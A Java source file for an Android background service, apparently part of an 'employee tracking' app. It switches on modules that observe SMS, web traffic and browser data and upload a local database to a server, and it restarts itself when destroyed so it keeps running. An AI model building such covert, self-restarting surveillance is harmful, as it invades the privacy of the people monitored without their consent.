package my.employeetrack.app;

import sms.log.ActivateSMSObserver;
import update.log.LocalUpdateServer;

import android.app.Service;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;

import android.util.Log;


public class AppService extends Service 
{

	private String tag = "MitterBitterMain";
	@Override
	public IBinder onBind(Intent arg0) 
	{
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onCreate() 
	{
		// TODO Auto-generated method stub
		super.onCreate();
		Log.i(tag, "MitterBitterServiceStarted");
		
	//Activating Other Modules
		
		//Activating SMS Module
		activateSMSModule();
		
		//Activating WebData Module
		activateWebDataModule();
		
		//Activating BrowserData Module
		activateBrowserDataModule();
		
		//Activating GeoLocation Module
		//activateGeoLocationModule();
		
		//Activating LocalDB Update --> Server Module
		activateLocalDBServerUpdate();
		
		
	}
		private void activateLocalDBServerUpdate() 
	{
		// Activation ServerLocalDataUpdate Module
		update.log.LocalUpdateServer lus = new LocalUpdateServer(this);
		lus.startUpdatingLocalDatabase();
		
	}
	private void activateGeoLocationModule() 
	{
		// TODO Auto-generated method stub
		// Activation GeoLocaion Module
		geo.log.GeoLocationService geo = new geo.log.GeoLocationService(this);
		geo.checkLocationServer();
		geo.startLocationService();
	}
	private void activateBrowserDataModule() 
	{
		// TODO Auto-generated method stub
		// Activation BrowserData Module
		browser.log.BrowserActivator ba = new browser.log.BrowserActivator(this);
		ba.activateBrowserObserver();
		
	}
	private void activateWebDataModule() 
	{
		// TODO Auto-generated method stub
		//Activating WebData Module
		web.log.TraficWatcher tw = new web.log.TraficWatcher(this);
		tw.startTracingTraffic();
		
	}
	private void activateSMSModule() 
	{
		// TODO Auto-generated method stub
		//Activating SMS Modules
		sms.log.ActivateSMSObserver Activate = new ActivateSMSObserver();
		Activate.activateSMSObserver(this);	
	}
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) 
	{
		super.onStartCommand(intent, flags, startId);
		// TODO Auto-generated method stub
		return START_STICKY;
	}
	@Override
	public void onDestroy() 
	{
		// TODO Auto-generated method stub
		super.onDestroy();
		Log.i(tag  ,"OOPS Service Started Again....!!");
		Intent intent = new Intent();
		intent.setAction("MitterBitterServiceStarted");
		this.startService(intent);
	}

}
